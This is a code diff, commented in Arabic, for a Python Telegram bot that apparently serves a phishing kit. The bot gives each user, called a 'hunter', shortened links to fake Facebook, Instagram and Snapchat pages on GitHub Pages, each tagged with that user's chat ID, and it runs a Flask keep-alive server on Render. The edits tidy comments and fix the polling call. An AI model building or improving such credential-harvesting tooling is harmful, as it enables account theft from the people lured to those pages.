@@ -4,13 +4,15 @@ from flask import Flask
 from threading import Thread
 import os
 
-# --- سيرفر لضمان بقاء البوت Live على Render ---
+# --- نظام الـ Keep Alive لضمان استمرار البوت ---
 app = Flask('')
+
 @app.route('/')
 def home():
     return "M.Y.9 System is Online"
 
 def run():
+    # استخدام بورت ديناميكي لـ Render
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
@@ -33,10 +35,11 @@ def short_link(url):
 def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
+    # ميزة "اسم الصياد" - تحويل الفراغات لشحطات
     hunter = first_name.replace(" ", "_")
-    base = "https://m-y-9-tech.github.io/fb/" # رابط صفحتك في GitHub Pages
+    base = "https://m-y-9-tech.github.io/fb/"
     
-    # توليد الروابط مع ID واسم الصياد
+    # توليد روابط فريدة لكل مستخدم مع الـ ID واسمه
     fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
     ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
     snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
@@ -67,4 +70,6 @@ def send_welcome(message):
 
 if __name__ == "__main__":
     keep_alive()
-    bot.infinity_polling(non_stop=True)
+    print("M.Y.9 System Started Successfully...")
+    # تم تصحيح الخطأ هنا (استخدام infinity_polling بدون تكرار بارامترات)
+    bot.infinity_polling()
